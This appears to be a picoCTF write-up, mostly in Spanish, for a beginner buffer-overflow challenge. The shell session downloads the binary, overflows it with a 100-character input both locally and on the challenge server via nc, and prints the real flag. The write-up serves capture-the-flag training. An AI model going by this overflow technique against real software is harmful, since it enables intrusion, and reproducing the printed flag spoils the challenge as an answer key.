## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).
## Solución
```
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ wget https://artifacts.picoctf.net/c/174/vuln                                             
--2024-11-13 00:01:28--  https://artifacts.picoctf.net/c/174/vuln
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 13.225.222.125, 13.225.222.120, 13.225.222.105, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|13.225.222.125|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16016 (16K) [application/octet-stream]
Saving to: ‘vuln’

vuln                         100%[============================================>]  15.64K  --.-KB/s    in 0.009s  

2024-11-13 00:01:29 (1.62 MB/s) - ‘vuln’ saved [16016/16016]

                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ chmod +x vuln  
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ ./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ echo "picoCTF{banderota}" > flag.txt
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ ./vuln                              
Input: holaYoSoyMateo
The program will exit now
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ ./vuln
Input: palabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTAS
picoCTF{banderota}
                                                                                                                  
┌──(kali㉿kali)-[~/picoCTF/BinExp/BufferOverflow0]
└─$ nc saturn.picoctf.net 54804
Input: palabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTASpalabrotasPALABROTAS
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

- ##### Al introducir una cadena de texto de 100 caracteres, obtenemos la bandera.
```
Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Notas Adicionales
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)